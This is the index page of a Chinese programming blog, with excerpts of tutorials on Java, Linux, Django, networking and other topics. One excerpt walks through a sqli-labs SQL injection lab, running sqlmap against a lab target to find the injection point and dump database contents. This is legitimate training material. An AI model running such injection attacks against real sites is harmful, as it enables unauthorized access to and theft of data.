<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程中国的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程中国的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程中国的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程中国的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/22ac2032c2649139f01d029856d0e7ab/" rel="bookmark">
			字符串 格式化 String.format()的详细解释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题：
当我们开发的时候，有时候会遇到需要输出一定格式的字符串，在JDK1.5中增加了一个非常有用的静态函数format(String format, Objece... argues)，可以将各类数据格式化为字符串并输出。其中format参数指定了输出的格式，是最复杂也是最难掌握的一点，而argues则是一系列等待被格式化的对象。 该函数对c语言中printf函数的用法进行了一定的模仿，因此有c语言基础的人学起来会轻松许多。下面我们着重讨论一下format 参数的格式及含义。 1.String.format() 有两种重载方式 format(String format, Object… args) 新字符串使用本地语言环境，制定字符串格式和参数生成格式化的新字符串。format(Locale locale, String format, Object… args) 使用指定的语言环境，制定字符串格式和参数生成格式化的字符串。例子 String str = String.format("%s今年%d岁。", "小李", 30); System.out.println(str); 结果为：小李今年30岁。 2.转换符说明 %s %S 字符串类型String.format("%s", "学校");学校%c 字符类型String.format("B的大写是：%c %n", 'B');B的大写是：B%b %B 布尔类型String.format("结果：%b %n", "小".equal("哥"));结果：false%d 整数类型（十进制）String.format("%d",88);88%x %X 整数类型（十六进制）FF%o 整数类型（八进制）77%f 浮点类型8.888%a 十六进制浮点类型FF.35AE%e %E 指数类型9.38e+5%g %G 通用浮点类型（f和e类型中较短的）不举例(基本用不到)%h %H 散列码不举例(基本用不到)%% 百分比类型％(%特殊字符%%才能显示%)%n 换行符不举例(基本用不到)%tx 日期与时间类型（x代表不同的日期与时间转换符)不举例(基本用不到) 3.搭配转换符的标志 +添加符号("%+d",5) +5－左对齐 ("%-5d",5)0数字前面补0("%05d", 55) 00055空格在整数之前添加指定数量的空格("%　5d", 55)，以“,”对数字分组("%,f", 5555.55)5,555.550000( 使用括号包含负数# 如果是浮点数则包含小数点，如果是16进制或8进制则添加0x或0("%#x", 99)和("%#o", 99) 0x63 和0143&lt; 格式化前一个转换符所描述的参数 ("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/22ac2032c2649139f01d029856d0e7ab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ed147c93a388d4b763b6b49400f139e/" rel="bookmark">
			【SQL注入-15】自动化注入案例—以sqli-labs-less9为例（利用sqlmap工具）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1 前言2 自动化注入案例—以sqli-labs-less9为例2.1 实验平台2.2 注入前准备2.3 判断注入点及注入类型2.3.1 自动判断注入点及注入类型2.3.2 手动判断注入点及注入点类型 2.4 爆库名2.5 爆表名2.6 爆字段名2.7 爆字段内容 3 批量爆破 1 前言 由于手动注入、半自动化注入效率较低，对于一些常规的、重复性的可以交由神奇sqlmap来完成。本节课从一个最基础的注入来简单介绍sqlmap工具。
2 自动化注入案例—以sqli-labs-less9为例 2.1 实验平台 （1）靶机：——虚拟机（IP为172.16.1.1）：本节实验靶场是在win2008系统上基于phpstudy搭建的一个sqli-labs漏洞靶场，win2008及phpstudy的安装过程可以参考《【语言环境】WAMP环境部署及优化—以win2008R2SP1为操作系统》，sqli-labs漏洞靶场的搭建可以参考《【环境搭建】基于WAMP环境的sqli-labs漏洞靶场的搭建》
。
（2）注入机：Kali系统，本实验利用kali自带的sqlmap来实现自动化注入。
（3）靶机与攻击机桥接到同一局域网中。
2.2 注入前准备 （1）打开靶机虚拟机，并打开phpstudy，并启动。
（2）打开kali系统，并打开sqlmap。打开kali系统，点击菜单搜索sql，点击sqlmap，打开界面如下。
（3）kali虚拟机上打开火狐浏览器，并使用火狐浏览器的访问靶机sqli-labs的Less9，打开页面如下。
2.3 判断注入点及注入类型 2.3.1 自动判断注入点及注入类型 （1）登录root用户。在kali终端，为保险起见输入命令sudo -i，登录root账户进行实验。
（2）判断注入点、注入参数的数据类型、注入类型及payload。在输入命令 sqlmap -u "http://172.16.1.1/sqli-labs/Less-9/?id=1" 对目标网站的参数是否能注入以及注入类型进行判断，代码执行过程如下
──(root💀kali)-[~] └─# sqlmap -u "http://172.16.1.1/sqli-labs/Less-9/?id=1" ___ __H__ ___ ___["]_____ ___ ___ {1.6.3#stable} |_ -| . [(] | .'| . | |___|_ [,]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3ed147c93a388d4b763b6b49400f139e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2863048fb107358d73d455f650610e94/" rel="bookmark">
			JDK8 Stream 常见应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、双循环遍历：
例：
ListOne.stream().forEach(one -&gt; ListTwo.stream().anyMatch(two-&gt;{ // 处理业务逻辑 ...... return false; })); 二、去重
1、针对 对象 一个字段： ArrayList&lt;ProductProcessDrawbackDto&gt; collect = records1.stream().collect(Collectors.collectingAndThen( Collectors.toCollection(() -&gt; new TreeSet&lt;&gt;( Comparator.comparing( ProductProcessDrawbackDto::getId))), ArrayList::new)); 2、针对 对象 多个字段： ArrayList&lt;PatentDto&gt; collect1 = patentDtoList.stream().collect(Collectors.collectingAndThen( Collectors.toCollection(() -&gt; new TreeSet&lt;&gt;( Comparator.comparing(p-&gt;p.getPatentName() + ";" + p.getLevel()))), ArrayList::new); 3、针对 Map： List&lt;Map&lt;String, Object&gt;&gt; list2 = list1.stream().collect( Collectors.collectingAndThen( Collectors.toCollection( () -&gt;new TreeSet&lt;&gt;(Comparator.comparing(m-&gt;m.get("value").toString())) ),ArrayList::new ) ); 三、排序
1、使用sort
// 倒序 ##写法1 list = list.stream() .sorted(Comparator.comparing(Test::getAge).reversed()) .collect(Collectors.toList()); ##写法2 list = list.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2863048fb107358d73d455f650610e94/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a47177bb274b7b98ad82e076b1a211c/" rel="bookmark">
			Qt Installer Framework应用总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Qt Installer Framework应用总结
官网文档位置：https://doc.qt.io/qtinstallerframework/ifw-overview.html
本文主要是讲解配置文件的区别以及脚本的使用和一些概念的理解 ，基础的使用方式直接参考官方文档最佳。
1、Centos7.9上安装
安装包下载地址：https://download.qt.io/official_releases/qt-installer-framework/
我选择的是3.1.1版本。
下载.run文件在centos上执行，顺序点“下一步”就行。
注：一定要记住安装的位置
2、简单的应用
参考官方文档：https://doc.qt.io/qtinstallerframework/ifw-tutorial.html
3、结构的讲解
基于：https://doc.qt.io/qtinstallerframework/ifw-reference.html
3.1、Configuration File
这是一个配置文件，贯穿整个安装、卸载、更新的配置信息，这个一定要明白！！！！一定要区别于package中的package.xml配置文件。
个人用到的最主要的字段
3.1.1、RemoveTargetDir
当为false时，在程序卸载的时候会不删除安装目录。
3.1.2、ControlScript
这个最重要，这里是用户自定义控制脚本的文件名，一般将该控制脚本放在与该配置文件同目录下。
控制脚本中使用到最多的就是installer全局变量
&lt;!--config.xml--&gt; &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;Installer&gt; &lt;Name&gt;测试标题&lt;/Name&gt; &lt;Version&gt;1.0.0&lt;/Version&gt; &lt;Title&gt;测试向导======******&lt;/Title&gt; &lt;Publisher&gt;test&lt;/Publisher&gt; &lt;StartMenuDir&gt;TestWorkstation&lt;/StartMenuDir&gt; &lt;RemoveTargetDir&gt;false&lt;/RemoveTargetDir&gt; &lt;ControlScript&gt;control.qs&lt;/ControlScript&gt; &lt;TargetDir&gt;@HomeDir@/TestWorkstation&lt;/TargetDir&gt; &lt;/Installer&gt; function Controller() { // 判断是否是卸载程序 if(installer.isUninstaller()){ installer.uninstallationStarted.connect(this, this.uninstallationStarted); } // 判断是否是安装程序 if(installer.isInstaller()){ installer.installationStarted.connect(this,this.installationStarted); } } // 卸载开始前需要执行的操作 Controller.prototype.uninstallationStarted = function() { installer.execute("touch","/home/centos/test_TTTTT"); installer.execute("mkdir","/home/centos/TestWorkstation"); installer.execute("mkdir","${HOME}/TestWorkstation/Databases"); installer.execute("cp",["/home/centos/TestWorkstation/app.png","/home/centos/TestWorkstation/test"]); } // 开始安装前执行的操作 Controller.prototype.installationStarted = function() { installer.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8a47177bb274b7b98ad82e076b1a211c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca1bf200c6c282837038a623f5fc19b9/" rel="bookmark">
			Markdown教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Markdown快捷入门(Visual Studio Code) Markdown是一种轻量级标记语言,它允许人们使用易读易写的纯文本格式编写文档，然后转换成有效的XHTML（或者HTML）文档。这种语言吸收了很多在电子邮件中已有的纯文本标记的特性。
由于Markdown的轻量化、易读易写特性，并且对于图片，图表、数学式都有支持，许多网站都广泛使用Markdown来撰写博客或是用于论坛上发表消息。 如Github、Reddit、简书、Reddit、CSDN等。学会该项语言一定会给你的工作、生活、学习提供很大的益处。
环境：下载安装好Vscode编辑器，并添加Vscode插件Markdown All in One 、Paste Image。
1.标题 为了使文章更有层次感,标题是你的不二之选
语法:
# 标题1 ## 标题2 ### 标题3 ………… 以此类推，支持1-6级标题，(#后面跟空格)
效果如下:
一级标题 二级标题 三级标题 四级标题 五级标题 六级标题 2.字体 加粗 语法：**内容**
效果如下:
内容
斜体 语法：*内容*
效果如下:
内容
斜体并加粗 语法：***内容***
效果如下:
内容
删除线 语法：~~内容~~
效果如下:
内容
高亮显示 语法：==内容==
效果如下:
内容
3.代码块 单独的代码块 语法：
```代码类型
代码内容
```
效果如下:
import java.util.Scanner; public class ScannerTest { public static void main(String[] args){ Scanner scanner=new Scanner(System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ca1bf200c6c282837038a623f5fc19b9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4fb128ddb1339c0cf97c74febe5be32e/" rel="bookmark">
			Java代码实现—冒泡排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、前言
2、冒泡排序
2.1 算法思路
2.2 代码实现过程：
3、代码优化
3.1 趟数优化
3.2 循环次数优化
3.3 排序完成优化
4、结语
1、前言 我们书接上回，接着数组中的遗留问题来讲解这节的冒泡排序，干货满满，里面还涉及到代码的优化，希望大家有所收获
2、冒泡排序 冒泡排序思想：给定一个数组，让数组升序 (降序) 排序。 2.1 算法思路 假设排升序： 将数组中相邻元素从前往后依次进行比较，如果前一个元素比后一个元素大，则交换，一趟下来后最大元素就在数组的末尾。依次从上上述过程，直到数组中所有的元素都排列好。依据这个思想，我们很容易写出如下代码： public static void main7(String[] args) { int[] array = {10,5,3,7,6}; myBubblesort(array); System.out.println(Arrays.toString(array)); } public static void myBubblesort(int[] array){ for (int i = 0; i &lt; array.length; i++) { for (int j = 0; j &lt; array.length-1; j++) { if(array[j] &gt; array[j+1]){ int tmp = 0; tmp = array[j]; array[j] = array[j+1]; array[j+1] = tmp; } } } } 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4fb128ddb1339c0cf97c74febe5be32e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01e561c72317f646bfe5f085664a81e3/" rel="bookmark">
			linux学习之必备命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		linux命令：
&amp; 表示任务在后台执行，如要在后台运行
&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令
| 表示管道，上一条命令的输出，作为下一条命令参数(输入)
|| 表示上一条命令执行失败后，才执行下一条命令
符号是指：将正常信息重定向
1、man：
man可以查看命令的用法
一般可以先使用“whatis ‘命令’”来查看命令相关信息，再使用“man ‘命令’”来查看命令的具体使用
翻屏： 向后翻一屏：space(空格键) 向前翻一屏：b 向后翻一行：Enter(回车键) 向前翻一行：k 按键 用处 空格键 向下翻一页。 [Page Down] 向下翻一页。 [Page Up] 向上翻一页。 [HOME] 直接前往首页。 [END] 直接前往尾页。 /关键词 从上至下搜索某个关键词,如"/linux"。 ?关键词 从下至上搜索某个关键词,如"?linux"。 n 定位到下一个搜索到的关键词。 N 定位到上一个搜索到的关键词。 q 退出帮助文档。 2、uname：获取电脑和操作系统的相关信息
3、lsb_release：查看当前系统的发行版信息
4、history：命令历史
5、su：用户切换
6、which：定位命令位置（whatis是关于命令的简要说明）
7、echo：回显，就是显示正在执行的批处理命令及执行的结果等
echo打印颜色输出：
字体颜色/背景颜色
num color
0 重置
30|40 黑色
31|41 红色
32|42 绿色
33|43 ***
34|44 蓝色
35|45 杨红
36|46 青色
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/01e561c72317f646bfe5f085664a81e3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7573e1d8988c27d974035b52299b4c08/" rel="bookmark">
			svn使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		svn 安装 apt install subversion 配置， 其实不需要怎么配置，
遇到的问题是普通用户每次都需要输入密码
修改
# ~/.subversion/config # 允许明码记住密码 password-stores = simple # 也可以在这里设置选项 # ~/.subversion/servers store-plaintest-passwords # 解压到指定路径 这个时候是 $svn_path 下的所有文件 在 $local_path下面 svn checkout $svn_path $local_path # 先进去再解压 这个时候是svn地址 当前文件开始命名 cd $local_path &amp;&amp; svn checkout $svn_path # 更新 cd $local_path svn update 关于错误：svn "cannot set LC_CTYPE locale"的问题 解决
# 修改/etc/profile # 加入 export LC_ALL=C # 然后在终端执行： source /etc/profile 毛用没有，
这样弄才解决的
sudo dpkg-reconfigure locales 重新安装了一下语言为en_US.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7573e1d8988c27d974035b52299b4c08/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc285152b1d5ee28fb619669fbe90f92/" rel="bookmark">
			IP地址与子网划分
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		IP地址与子网划分 IP地址是一个32位的二进制地址，被分为4个8位段（八位组）。人们不习惯使用32的二进制地址或8位的二进制八位组，所以IP地址最常用的表达形式是点分十进制形式。
IP地址分类
IP地址中一部分是网络ID，另一部分是主机ID，地址分类系统把IP地址划分为不同的地址类：
A类地址：IP地址的前8位表示网络ID，后24位表示主机IDB类地址：IP地址的前16位表示网络ID，后16位表示主机IDC类地址：IP地址的前24位表示网络ID，后8位表示主机ID 使用的位数越多，包含的组合就越多，可知A类地址较少的网络ID，但每个网络都具有大量的可用主机ID。**那计算机或路由器是如何将一个IP地址解释为A类、B类还是C类呢？**其实二进制的前几位就是用来地址分类，如下表：
[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-Pl96Sknh-1652003268022)(D:\file_place\Typora\常用的指令.assets\v2-0cba0b20ee3378db202e92ceb289ab28_720w.jpg)]
注：
D类地址，前4位为1110，用于多播（组播）E类地址，前5位为11110，实验性质的，不用于生产环境排除地址指的是私有IP地址，用于本地局域网的IP地址分配 特殊的IP地址
全0主机ID：表示网络本身，如IP地址129.152.0.0是指网络ID为129.152的B类网络全1主机ID：表示广播地址，如IP地址129.152.255.255是指网络ID为129.152的B类网络的广播地址十进制127开头的地址：环回地址，用于测试自身TCP/IP软件是否正常，如ping自己127.0.0.1 子网掩码
子网掩码是需要配合IP地址一起使用的，用于指示IP地址的前多少比特是网络ID，后多少比特是主机ID。
A、B、C类地址均有默认的掩码，也称固定掩码：
[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-ggvZf4cw-1652003268023)(D:\file_place\Typora\常用的指令.assets\v2-1c4f05c9b879266e815b5b32bb4f7b37_720w.jpg)]
子网划分
子网划分是从主机号字段借用若干位比特，把物理网络分解为更小的逻辑实体（称为子网）的一种手段，从而可以更加充分的利用有限的IP地址资源。
将初始网络分段，必须设计一种编址方案，能够识别出大型网络中的每个子网。一台特定主机可以通过以下三项被唯一识别：
网络号唯一地指定主机所在网路（如果网络是公共互联网，网络号就是表示网络的地址，包括了其所有的子网）子网号唯一的指定了一个子网（初始网络内部的子网），一个子网内部包含若干主机主机号唯一地指定了子网内的某台主机 子网划分的几个步骤
1、确定需要的子网个数2、确定一个子网内可能的最多主机数量3、确定从主机号字段借用的比特数，用于创建子网号字段4、确定主机号字段需要保留的比特数（不能被子网字段借用的比特数）5、确定原始网络号字段和主机号字段的比特数6、检查以确保被借用的比特数没有超过被保留的比特数（即检查子网划分问题是可解的）7、设置子网号字段的最佳长度，包括为未来增长预留空间8、创建一个修改（自定义）的子网掩码9、确定有效的子网号10、确定每个子网的IP地址有效范围 子网划分举例
问题：有一个C类地址193.200.35.0，分配给某个组织，该组织需要两个子网，每个子网的主机数不会超过30台。
分析：子网数S=2，每个子网内最多的主机数H=30，C类地址的主机位比特T=8
确定子网个数，S=2确定一个子网内可能的最多主机数量，H=30求解2^s - 2 &gt;= S的最小整数s，解得s=2，即从主机号字段借用的比特数，用于创建子网号字段求解2^h - 2 &gt;= H的最小整数h，解得h=5，即主机号字段需要保留的比特数确定原始网络号字段和主机号字段的比特数，网络号字段为24，主机号字段T=8因为s + h = 2 +5 =7 &lt; 8，即借用的比特数没有超过被保留的比特数，问题可解由于7 &lt; 8，并且r = T - s - h = 1，因而可将 r分配给s或h，通常情况下子网的数量相比子网内主机的数量更容易耗尽，因而将r分配给s，即s = s + r = 2 + 1 =3，此时s + h = 3 + = 8 = T创建一个自定义的子网掩码，默认C类地址的子网掩码为255.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bc285152b1d5ee28fb619669fbe90f92/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7d59046706313b9dff66dfb66da88ba9/" rel="bookmark">
			elasticsearch搭建遇到的问题整理合集2
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		es遇到的问题2 1、数据data 默认情况下es的data都是存在于path.data所指定的目录的，path.data默认为文件的data目录，
所以data存在着上一次或者上几次的运行配置
故有些时候需要清空data来重新运行
2、关于cluster.initial_master_nodes 使用的7.13的版本，有一些配置过时了
过时配置配置（新）discovery.zen.ping.unicast.hostsdiscovery.seed_hostsdiscovery.zen.hosts_providerdiscovery.seed_providersdiscovery.zen.nomasterblockcluster.nomasterblock discovery.seed_hosts
提供集群中符合主机要求的节点的列表. 每个值的格式为host:port或host ，其中port默认为设置transport.profiles.default.port。
discovery.seed_providers
以文件的方式提供主机列表，可以动态修改，而不用重启节点（容器化环境适用）
cluster.initial_master_nodes
设置全新群集中符合主机要求的节点的初始集合. 默认情况下，该列表为空，这意味着该节点希望加入已经被引导的集群
discovery.findpeersinterval
选定主节点发现时间间隔,默认1S
注意：自己测试中发现具有选举权的master节点一定要设置cluster.initial_master_nodes，值为当前所有可以参与选举的节点，否则会出现“master not discovered yet”的错误；
非master节点可以不设置，设置了反而会出现真正的master节点无法实时发现的问题，猜测原因可能是因为，单独的node节点因为设置了，所以与master节点不会主动发生通信
官网文档如下：
cluster.initial_master_nodes
(Static) Sets the initial set of master-eligible nodes in a brand-new cluster. By default this list is empty, meaning that this node expects to join a cluster that has already been bootstrapped. See cluster.initial_master_nodes.
在全新的集群中设置初始主节点集。 默认情况下，这个列表是空的，这意味着这个节点希望加入一个已经被引导的集群。
具备成为master节点的应该设置initial_master_nodes为一个master集群列表，而其他的node不用设置，可以自己引导（测试发现如果都设置，第一次启动集群时，master节点必须最后启动才可以完全发现所有的node）
更新，有毒吧，全设置了initial_master_nodes，删除了data数据又重新测试了一下，居然master可以不用最后启动了也可以全部发现了。那就是昨天本机网络有问题？
3、关于master节点 设置了node-master：true的节点，表示有资格成为Master的节点。
选举Master选举Master需要所有的Master候选节点共同工作，即使某些节点发生了故障，这个工作也必须能够正常进行，es需要通过仲裁的方式选取出还能正常工作的节点，再组成集群，避免形成“脑裂”，这里“脑裂”是指，可能出现不止一个Master节点，比如节点间的通信断开后，各个Master候选节点都有可能认为其他节点都宕机，提升自己为Master，造成集群状态不一致的情况。由此衍生出参与选主时，需要配置能通信的候选节点数量。discovery.zen.minimummasternodes，缺省配置是1.一个基本的原则是这里需要设置成 N/2 1, N是集群中节点的数量。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7d59046706313b9dff66dfb66da88ba9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c8782e2fabf3e0fbe204103596dc3266/" rel="bookmark">
			django学习整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Django 创建项目 django-admin startproject $项目名 模型模块module 总览
module.objects.all() 获取该实例的所有信息module.objects.add() 添加module.objects.create() 创建module.objects.get()module.objects.filter(**kargs) 过滤器 返回包含指定参数的QuerySetmodule.objects.exclude(**kargs) 返回不包含指定参数的QuerySetmodule.objects.annotate()module.objects.order_by() 排序module.objects.annotate()module.objects.alias() filter/other
过滤后的QuerySet都是唯一的
前缀为变量或者说字段名
后缀如下：
__gt : 大于
__gte : 大于等于
__lt : 小于
__lte : 小于等于
__in : 其中之一
__range : 范围
__year : 日期-年
__exact：“精确”匹配（区分大小写）
__iexact：是不区分大小写的匹配项
__contains：区分大小写的模糊查询
__icontains：不区分大小写的模糊查询，与contains相对应。
__startswith：以什么开头的模糊查询（区分大小写）
__istartswith：以什么开头的模糊查询（不区分大小写）
__endswith：以什么结尾的模糊查询（区分大小写）
__iendswith：以什么结尾的模糊查询（不区分大小写）
__isnull : 是空的
__regex : 区分大小写的正则匹配
__iregex : 不区分大小写的正则匹配
模型类 1、模型定义 每个模型都是python的一个类，且需继承 django.db.models.Model
类下每个属性都相当于一个数据库字段
每当新建一个模型的时候，都需要在 setting.py下的 INSTALL_APPS 配置，如
新建 app
python manage.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c8782e2fabf3e0fbe204103596dc3266/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/af08547399fd3f8bec6c18000a9b175e/" rel="bookmark">
			Python filter使用学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天想跟大家分享一下关于Python中的过滤器相关知识，主要针对数据部分，过滤器filter()函数其实能帮助我们解约不少时间，应用也十分广泛。
1、filter() 函数的介绍 1.1 功能 filter() 函数用于 过滤 可迭代对象中不符合条件的元素，返回由符合条件的元素组成的新的迭代器。filter() 函数把传入的函数依次作用于每个元素，然后根据返回值是 True 还是 False，来决定保留或丢弃该元素。
1.2 语法 参数说明：
(1) function：用于实现判断的函数，可以为 None。
(2) iterable：可迭代对象，如列表、range 对象等。
(3) 返回值：返回一个迭代器对象。
2、filter() 函数的应用 2.1 filter() 函数的基本应用 使用 filter() 函数过滤出 0~100 (不包括 100) 之间的所有奇数，代码如下：
list(filter(lambda x:x&amp;1, range(100))) 运行结果
[1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23, 25, 27, 29, 31, 33, 35, 37, 39, 41, 43, 45, 47, 49, 51, 53, 55, 57, 59, 61, 63, 65, 67, 69, 71, 73, 75, 77, 79, 81, 83, 85, 87, 89, 91, 93, 95, 97, 99] 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/af08547399fd3f8bec6c18000a9b175e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7fc2f5ff3e059c42e4222e44ec3ea633/" rel="bookmark">
			05 传统html&#43;vue&#43;elementUI开发&amp;nodeJS环境搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一.什么是ElementUI
举例 消息组件
二. Node.js是什么
三. npm是什么
四. Node.js环境搭建
五. 配置npm全局模块路径和cache默认安装位置
六. 修改npm镜像提高下载速度(可以使用 cnpm 或 直接设置 --registry ，推荐设置 --registry)
七. 验证安装结果
八. 如何运行下载的Node.js项目
一.什么是ElementUI 1. ElementUI简介
我们学习VUE,知道它的核心思想式组件和数据驱动,但是每一个组件都需要自己编写模板,样式,添加事件,数据等是非常麻烦的,
所以饿了吗推出了基于VUE2.0的组件库,它的名称叫做element-ui,提供了丰富的PC端组件
ElementUI官网：http://element-cn.eleme.io/#/zh-CN
举例 消息组件 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8" /&gt; &lt;title&gt;&lt;/title&gt; &lt;!-- 1. 导入css --&gt; &lt;link href="https://cdn.bootcss.com/element-ui/2.8.2/theme-chalk/index.css" rel="stylesheet"&gt; &lt;!-- 2. 引入vue和vue-router--&gt; &lt;script src="https://cdn.bootcss.com/vue/2.6.10/vue.js"&gt;&lt;/script&gt; &lt;!-- 未使用vue路由功能可不导入 --&gt; &lt;script src="https://cdn.bootcss.com/vue-router/3.0.6/vue-router.js"&gt;&lt;/script&gt; &lt;!-- 3. 引入ElementUI组件 --&gt; &lt;script src="https://cdn.bootcss.com/element-ui/2.8.2/index.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="app"&gt; &lt;el-button :plain="true" @click="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7fc2f5ff3e059c42e4222e44ec3ea633/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/18bd17e3a7224ff0f5ad7c122e5282d9/" rel="bookmark">
			matlab第二课--结构化程式与自定义函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.常用的结构化程式 if else语法
​ if(condition1)
​ statement1
​ else（else if (condition2)）
​ statement2
​ end
switch语法
​ switch expression
​ case value1
​ statement1
​ case value2
​ statement2
​ …
​ otherwise
​ Final statement
​ end
while语法
​ while condition
​ statement
​ end
break语法
​ 与c一样
2.小技巧
2.1 "..."是换行符；当矩阵A中元素太多时，可使用该符号 2.2当程序在循环结构
运行时，可使用ctrl+c跳出循环
2.3使用循环语句时，应该尽量提前分配内存空间
Program2 tic A = zeros(2000, 2000); 预先为变量分配内存空间 ​ for ii = 1:2000 ​ for jj = 1:2000 ​ A(ii,jj) = ii + jj; ​ end ​ end toc 程序花费2s Program1 tic ​ for ii = 1:2000 ​ for jj = 1:2000 ​ A(ii,jj) = ii + jj; ​ end ​ end toc 程序花费4s
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/18bd17e3a7224ff0f5ad7c122e5282d9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/790cb0a24d0b53cd550348353e130c7c/" rel="bookmark">
			Makefile学习笔记12|自定义makefile函数调用实现中的install
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Makefile学习笔记12|自定义makefile函数调用实现中的install 希望看到这篇文章的朋友能在评论区留下宝贵的建议来让我们共同成长，谢谢。
这里是目录 安装 创建目录：~/make/src/test_install。在此路径下创建文件：test_install.cpp。make test_install后再./test_install，运行无误后进行下一步。后面要把test_install安装进/usr/bin/。
